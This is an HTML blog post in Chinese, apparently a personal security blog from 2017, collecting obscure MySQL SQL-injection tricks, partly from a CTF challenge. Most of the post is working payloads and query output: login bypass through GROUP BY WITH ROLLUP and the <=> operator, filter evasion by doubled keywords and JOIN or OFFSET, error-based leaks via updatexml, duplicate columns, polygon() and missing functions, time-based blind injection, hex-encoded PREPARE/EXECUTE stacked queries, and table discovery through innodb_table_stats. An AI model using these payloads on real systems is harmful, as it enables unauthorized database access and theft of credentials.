@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=">
+
+
+  <link rel="mask-icon" href="/images/favicon.png?v=" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="KidHat" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="GROUP BY WITH ROLLUP常规的用法是SELECT * FROM table_name GROUP BY a WITH ROLLUP让查询出的增加一条a为NULL的行。SELECT * FROM users WHERE username=&amp;#39;admin&amp;#39; GROUP BY password WITH ROLLUP会产生一个password为NULL的行，用limit把它">
+<meta property="og:type" content="article">
+<meta property="og:title" content="其他偏门技巧">
+<meta property="og:url" content="https://kidhat.github.io/2017/11/19/其他偏门技巧/index.html">
+<meta property="og:site_name" content="KidHat">
+<meta property="og:description" content="GROUP BY WITH ROLLUP常规的用法是SELECT * FROM table_name GROUP BY a WITH ROLLUP让查询出的增加一条a为NULL的行。SELECT * FROM users WHERE username=&amp;#39;admin&amp;#39; GROUP BY password WITH ROLLUP会产生一个password为NULL的行，用limit把它">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-11-19T09:34:56.224Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="其他偏门技巧">
+<meta name="twitter:description" content="GROUP BY WITH ROLLUP常规的用法是SELECT * FROM table_name GROUP BY a WITH ROLLUP让查询出的增加一条a为NULL的行。SELECT * FROM users WHERE username=&amp;#39;admin&amp;#39; GROUP BY password WITH ROLLUP会产生一个password为NULL的行，用limit把它">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://kidhat.github.io/2017/11/19/其他偏门技巧/"/>
+
+
+
+
+
+  <title>其他偏门技巧 | KidHat</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">KidHat</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">在不断尝试活出更好的自己</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://kidhat.github.io/2017/11/19/其他偏门技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="KidHat">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KidHat">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">其他偏门技巧</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-19T12:14:26+08:00">
+                2017-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="GROUP-BY-WITH-ROLLUP"><a href="#GROUP-BY-WITH-ROLLUP" class="headerlink" title="GROUP BY WITH ROLLUP"></a>GROUP BY WITH ROLLUP</h1><p>常规的用法是<br><code>SELECT * FROM table_name GROUP BY a WITH ROLLUP</code><br>让查询出的增加一条a为NULL的行。<br><code>SELECT * FROM users WHERE username=&#39;admin&#39; GROUP BY password WITH ROLLUP</code><br>会产生一个password为NULL的行，用limit把它取出来就行<br><code>mysql&gt; SELECT * FROM users WHERE user=&#39;admin&#39; GROUP BY password WITH ROLLUP limit 1,1;</code><br>然后传入一个空的password会使得NULL == NULL绕过验证。<br>上面那条语句需要知道一个username的名字，如果不知道的话怎么办，可以用 <code>username=” or 1=1</code> 绕过，如果 or 被过滤了怎么办，可以用 <code>username=”=0</code>来绕过。</p>
+<h1 id="select-n-绕过未知字段名-offset绕过limit的逗号"><a href="#select-n-绕过未知字段名-offset绕过limit的逗号" class="headerlink" title="(select n)绕过未知字段名|offset绕过limit的逗号"></a>(select n)绕过未知字段名|offset绕过limit的逗号</h1><p>存放flag的字段名未知，information_schema.columns也将表名的hex过滤了，即获取不到字段名；这时可以利用联合查询，过程如下：<br>思想就是获取flag，让其在已知字段名下出现；<br><code>mysql&gt; select (select 1)a,(select 2)b,(select 3)c,(select 4)d;</code><br>+—+—+—+—+<br>| a | b | c | d |<br>+—+—+—+—+<br>| 1 | 2 | 3 | 4 |<br>+—+—+—+—+<br>1 row in set (0.00 sec)<br><code>mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;</code><br>+—+—+—+—+<br>| 1 | 2 | 3 | 4 |<br>+—+—+—+—+<br>| 1 | 2 | 3 | 4 |<br>+—+—+—+—+<br>1 row in set (0.00 sec)<br><code>mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user;</code><br>+—+——-+———-+————-+<br>| 1 | 2     | 3        | 4           |<br>+—+——-+———-+————-+<br>| 1 | 2     | 3        | 4           |<br>| 1 | admin | admin888 | 110@110.com |<br>| 2 | test  | test123  | 119@119.com |<br>| 3 | cs    | cs123    | 120@120.com |<br>+—+——-+———-+————-+<br>4 rows in set (0.01 sec)<br><code>mysql&gt; select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e;</code><br>+————-+<br>| 4           |<br>+————-+<br>| 4           |<br>| 110@110.com |<br>| 119@119.com |<br>| 120@120.com |<br>+————-+<br>4 rows in set (0.03 sec)<br><code>mysql&gt; select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e limit 1 offset 3;</code><br>+————-+<br>| 4           |<br>+————-+<br>| 120@120.com |<br>+————-+<br>1 row in set (0.01 sec)<br><code>ysql&gt; select * from user where id=1 union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d
+union select * from user)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;</code><br>+————-+———-+———-+————-+<br>| id          | username | password | email       |<br>+————-+———-+———-+————-+<br>| 1           | admin    | admin888 | 110@110.com |<br>| 120@120.com | 1        | 1        | 1           |<br>+————-+———-+———-+————-+<br>2 rows in set (0.04 sec)</p>
+<h1 id="通过HAVING跟-lt-gt-绕过limit限制"><a href="#通过HAVING跟-lt-gt-绕过limit限制" class="headerlink" title="通过HAVING跟&lt;=&gt;绕过limit限制"></a>通过HAVING跟&lt;=&gt;绕过limit限制</h1><p>还是上面那道题，如果逗号被过滤无法用 limit n,1 可以用 limit 1 offset 1绕过，那更严格的，limit被过滤应该怎么办？要知道的是，要想通过with rollup返回一个含有Null的行，必须要查询成功，也就是说查询出的结果至少含有两行，而我们需要把password=null的那一行挑出来。为了知道我们能干什么，需要理解SELECT的语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">    [ALL | DISTINCT | DISTINCTROW ]</div><div class="line">      [HIGH_PRIORITY]</div><div class="line">     [STRAIGHT_JOIN]</div><div class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</div><div class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</div><div class="line">    select_expr [, select_expr ...]</div><div class="line">    [FROM table_references</div><div class="line">     [PARTITION partition_list]</div><div class="line">    [WHERE where_condition]</div><div class="line">    [GROUP BY &#123;col_name | expr | position&#125;</div><div class="line">      [ASC | DESC], ... [WITH ROLLUP]]</div><div class="line">    [HAVING where_condition]</div><div class="line">    [ORDER BY &#123;col_name | expr | position&#125;</div><div class="line">   [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</div><div class="line">    [PROCEDURE procedure_name(argument_list)]</div><div class="line">    [INTO OUTFILE &apos;file_name&apos;</div><div class="line">        [CHARACTER SET charset_name]</div><div class="line">        export_options</div><div class="line">     | INTO DUMPFILE &apos;file_name&apos;</div><div class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</div></pre></td></tr></table></figure></p>
+<p>我们当前的语句处于GROUP BY位置，而他的下一条可以使用的语句是HAVING，能不能通过构造HAVING语句找到我们password=null的那一行，当然是可以的。HAVING语句生效的原因是where_condition为true，如果直接使用HAVING password=null的话不会生效因为mysql中 null = null 会返回 null，万幸的是mysql还有一个比较操作符 &lt;=&gt;，当 null &lt;=&gt; null 的时候会返回1，于是可以构造类似下面的语句：<br><code>SELECT * FROM users WHERE username=&#39;&#39;=0 GROUP BY password WITH ROLLUP HAVING password &lt;=&gt; null;</code><br>这样就可以只查询出password = null的那一行从而bypass验证。</p>
+<h1 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h1><h2 id="join构造查询"><a href="#join构造查询" class="headerlink" title="join构造查询"></a>join构造查询</h2><p>mysql中JOIN有三种语法，分别是LEFT JOIN, RIGHT JOIN以及INNER JOIN(JOIN)，在SQL注入中的作用主要是构造查询，比如以前ph师傅的那道题：</p>
+<blockquote>
+<p>$table = addslashes($_GET[‘table’]);<br>    $sql = “UPDATE `{$table}`<br>    SET `username`=’admin’<br>    WHERE id=1”;<br>    if(!mysqli_query($conn, $sql)) {<br>    echo(mysqli_error($conn));<br>}<br>mysqli_close($conn);</p>
+</blockquote>
+<p>在直接打印出错误的情况下，报错注入是最优先的方法，各位表哥都是用了join的方法来构造查询，类似于：<br><code>UPDATE</code> `table_name` JOIN (SELECT(updatexml(1,concat(0x7e,user(),0x7e),1))) `a` SET `username`=’admin’ WHERE id=1;<br>这个方法主要是使用了UPDATE的跨表更新，官方手册下的评论有一个例子：</p>
+<blockquote>
+<p>UPDATE TABLE_1 LEFT JOIN TABLE_2 ON TABLE_1.COLUMN_1= TABLE_2.COLUMN_2<br>SET TABLE_1.COLUMN = EXPR WHERE TABLE_2.COLUMN2 IS NULL</p>
+</blockquote>
+<p>其中TABLE_2处可以引入一个子查询从而达到报错注入的目的。<br>如果没有错误回显的话，时间盲注也是可以的，例如：<br><code>UPDATE</code> `table_name` JOIN (SELECT if(1=1,sleep(10),0))) `a` SET `username`=’admin’ WHERE id=1;</p>
+<h2 id="2-join来进行绕过，可以绕过逗号"><a href="#2-join来进行绕过，可以绕过逗号" class="headerlink" title="2.join来进行绕过，可以绕过逗号"></a>2.join来进行绕过，可以绕过逗号</h2><p><code>mysql&gt; SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d;</code><br>+—+—+—+—+<br>| 1 | 2 | 3 | 4 |<br>+—+—+—+—+<br>| 1 | 2 | 3 | 4 |<br>+—+—+—+—+</p>
+<h2 id="3-绕过union限制"><a href="#3-绕过union限制" class="headerlink" title="3.绕过union限制"></a>3.绕过union限制</h2><p><code>mysql&gt; select user from users  where user_id=1 and (select * from (select * from users as a join users as b ) as c);</code><br>ERROR 1060 (42S21): Duplicate column name ‘user_id’<br>把当前表第一个字段成功爆出来了。<br>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。<br>同时，可以利用using爆其他字段</p>
+<blockquote>
+<p>using()用于两张表的join查询，要求using()指定的列在两个表中均存在，并使用之用于join的条件</p>
+</blockquote>
+<p><code>mysql&gt; select user from users  where user_id=1 and (select * from (select * from users as a join users as b using(password)) as c);</code><br>ERROR 1060 (42S21): Duplicate column name ‘user_id’</p>
+<h1 id="Polygon爆出已知库、表、列"><a href="#Polygon爆出已知库、表、列" class="headerlink" title="Polygon爆出已知库、表、列"></a>Polygon爆出已知库、表、列</h1><blockquote>
+<p>Polygon(ls1, ls2, …)<br>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL<br>  如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</p>
+</blockquote>
+<p><code>mysql&gt; select * from users where user_id=1 and polygon(user_id);</code><br>ERROR 1367 (22007): Illegal non geometric ‘`dvwa`.`users`.`user_id`‘ value found during parsing</p>
+<h1 id="函数不存在爆出库名"><a href="#函数不存在爆出库名" class="headerlink" title="函数不存在爆出库名"></a>函数不存在爆出库名</h1><p>上面的方法已经可以爆出库名了，但是如果我无限限制payload长度又如何？ 比如 四字节？<br><code>mysql&gt; select * from users where user_id=1-a();</code><br>ERROR 1305 (42000): FUNCTION dvwa.a does not exist<br><strong>原理</strong>：一个库中存在不同的系统或自定义函数，如果函数不存在，他就会爆出这个库没有此函数。</p>
+<h1 id="set-PREPARE-EXECUTE使用自定义语句"><a href="#set-PREPARE-EXECUTE使用自定义语句" class="headerlink" title="set+PREPARE+EXECUTE使用自定义语句"></a>set+PREPARE+EXECUTE使用自定义语句</h1><p>SET用于设置不同类型的变量<br>PREPARE statement_name FROM preparable_SQL_statement; /<em>定义</em>/<br>EXECUTE statement_name [USING @var_name [, @var_name] …]; /<em>执行预处理语句</em>/<br>{DEALLOCATE | DROP} PREPARE statement_name /<em>删除定义</em>/ ;<br><code>mysql&gt;  select group_concat(schema_name) from information_schema.schemata;</code><br>+———————————————————+<br>| group_concat(schema_name)                               |<br>+———————————————————+<br>| information_schema,mysql,performance_schema,test,veneno |<br>+———————————————————+<br>1 row in set (0.01 sec)</p>
+<p><code>mysql&gt; set @b=0x7365742040613d2873656c6563742067726f75705f636f6e63617428736368656d615f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e736368656d61746129;</code><br>Query OK, 0 rows affected (0.01 sec)<br>(十六进制解码 set @a=(select group_concat(schema_name) from information_schema.schemata))</p>
+<p><code>mysql&gt; prepare x from @b;</code><br>Query OK, 0 rows affected (0.01 sec)<br>Statement prepared</p>
+<p><code>mysql&gt; execute x;</code><br>Query OK, 0 rows affected (0.00 sec)</p>
+<p><code>mysql&gt; select @a;</code><br>+———————————————————+<br>| @a                                                      |<br>+———————————————————+<br>| information_schema,mysql,performance_schema,test,veneno |<br>+———————————————————+<br>1 row in set (0.01 sec)</p>
+<p><code>/0%0dununionion%0dselselectect%0d*%0dfrom%0d((selselectect%0d1)a%0djojoinin%0d(selselectect%0d3)b%0djojoinin%0d(selselectect(@a))c);set%0d@b=0x7365742040613d2873656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d27736869612729;prepare%0dx%0dfrom%0d@b;execute%0dx;</code><br><em>encoding</em>:set @a=(select group_concat(table_name) from information_schema.tables where table_schema=’shia’)<br>===&gt;table is shia too;<br>===&gt;also find the column is flag:)<br><code>/0%0dununionion%0dselselectect%0d*%0dfrom%0d((selselectect%0d1)a%0djojoinin%0d(selselectect%0d3)b%0djojoinin%0d(selselectect(@a))c);set%0d@b=0x7365742040613d2873656c6563742067726f75705f636f6e636174282771756f746527292066726f6d20666c616729;prepare%0dx%0dfrom%0d@b;execute%0dx;</code><br><em>encoding</em>:set @a=(select group_concat(‘quote’) from flag)<br>===&gt;id,aoscquewrvadasd,ungue$$4bl3looooongColuMMnnam3334,qoiihutwregaisfuiad<br>OK:)<br><code>/0%0dununionion%0dselselectect%0d*%0dfrom%0d((selselectect%0d1)a%0djojoinin%0d(selselectect%0d3)b%0djojoinin%0d(selselectect(@a))c);set%0d@b=0x7365742040613d2873656c6563742067726f75705f636f6e6361742827716f696968757477726567616973667569616427292066726f6d20666c616729;prepare%0dx%0dfrom%0d@b;execute%0dx;</code><br><em>encoding</em>:set @a=(select group_concat(‘qoiihutwregaisfuiad’) from flag)<br>===&gt;<br>{<br>  “reason”: “&lt;\p&gt;&lt;\strong&gt;3&lt;/\strong&gt;&lt;/\p&gt;&lt;\p&gt;&lt;\footer&gt;by Shia - added wrong row man….,du schaffst es,no flag here,come on, you can do it!,33C3_runnn!ng_for_your_life_fRom<em>shia</em>!,you went too far!&lt;/\footer&gt;&lt;/\p&gt;”,<br>  “success”: 1<br>}</p>
+<h1 id="innodb存储引擎的利用-Mysql-gt-5-6-x"><a href="#innodb存储引擎的利用-Mysql-gt-5-6-x" class="headerlink" title="innodb存储引擎的利用(Mysql&gt;5.6.x)"></a>innodb存储引擎的利用(Mysql&gt;5.6.x)</h1><p>对于常见的mysql注入来说，我们常利用mysql中自带存储整个数据信息的information_schema数据库来注入查询数据。但是当我们遇到正则将其关键字，例如information禁掉后该如何注入呢？或许你有千万种敏感字符绕过姿势，但是今天我在逛国外网站时发现有人提到了innodb，所以我就测试了下，发现其可以在特定版本中替代information_schema库作为注入数据的突破口。<br>Mysql&gt;5.6.x<br>在Mysql中，存储数据的默认引擎分为两类。一类是在5.5.x之前的MyISAM数据存储引擎，另一类是5.5.x版本后的innodb引擎。并且mysql开发团队在5.5.x版本后将innodb作为数据库的默认引擎。<br>而在mysql 5.6.x版本起，innodb增添了两个新表，一个是innodb_index_stats,另一个是innodb_table_stats。查阅官方文档，其对这两个新表的解释如下图：<br>从官方文档我们可以发现两个有用的信息：</p>
+<blockquote>
+<p>从5.6.x版本开始，innodb_index_stats和innodb_table_stats数据表时自动设置的。<br>两个表都会存储数据库和对应的数据表。</p>
+</blockquote>
+<p>本地实验<br>那么我们来本地实验下，我是用mysql 5.7.2版本来实验<br><code>select @@innodb_version;</code><br>查看已有的数据库<br>查看innodb_table_stats表中的数据<br><code>select * from mysql.innodb_table_stats;</code><br>表中只有两个系统数据库和一个user数据库和对应表名，以及最后更新时间。这个结果很是让人疑惑，既然有数据，但是为什么数据不全，单单只出现了一个数据库。再次查阅官方文档，从文档的实例中发现这两个表其实是用于记录更改和新创建的数据库和表的信息，但准确的说是保存最近的数据库变动记录，但是具体会保留多久呢？官方文档是写的是InnoDB Persistent Statistics Tables（永久记录表）。观察表中显示user数据库是11月4号创建的，而笔者测试的时候是11月14号，中间相隔10天。那么这里我们再次创建一个inno_test的数据库。<br>发现也被记录了下来。于是我们就有了取代information_schema的注入payload<br><code>select table_name from mysql.innodb_table_stats where database_name=schema();</code><br>就能够成功注入。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/07/MySql注入-各种绕过姿势/" rel="next" title="MySql注入-各种绕过姿势">
+                <i class="fa fa-chevron-left"></i> MySql注入-各种绕过姿势
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/19/biji/" rel="prev" title="biji">
+                biji <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="KidHat" />
+            
+              <p class="site-author-name" itemprop="name">KidHat</p>
+              <p class="site-description motion-element" itemprop="description">冷冷雨喔呃喔...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/KidHat" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GROUP-BY-WITH-ROLLUP"><span class="nav-number">1.</span> <span class="nav-text">GROUP BY WITH ROLLUP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#select-n-绕过未知字段名-offset绕过limit的逗号"><span class="nav-number">2.</span> <span class="nav-text">(select n)绕过未知字段名|offset绕过limit的逗号</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#通过HAVING跟-lt-gt-绕过limit限制"><span class="nav-number">3.</span> <span class="nav-text">通过HAVING跟<=>绕过limit限制</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JOIN"><span class="nav-number">4.</span> <span class="nav-text">JOIN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#join构造查询"><span class="nav-number">4.1.</span> <span class="nav-text">join构造查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-join来进行绕过，可以绕过逗号"><span class="nav-number">4.2.</span> <span class="nav-text">2.join来进行绕过，可以绕过逗号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-绕过union限制"><span class="nav-number">4.3.</span> <span class="nav-text">3.绕过union限制</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Polygon爆出已知库、表、列"><span class="nav-number">5.</span> <span class="nav-text">Polygon爆出已知库、表、列</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#函数不存在爆出库名"><span class="nav-number">6.</span> <span class="nav-text">函数不存在爆出库名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#set-PREPARE-EXECUTE使用自定义语句"><span class="nav-number">7.</span> <span class="nav-text">set+PREPARE+EXECUTE使用自定义语句</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#innodb存储引擎的利用-Mysql-gt-5-6-x"><span class="nav-number">8.</span> <span class="nav-text">innodb存储引擎的利用(Mysql>5.6.x)</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">KidHat</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
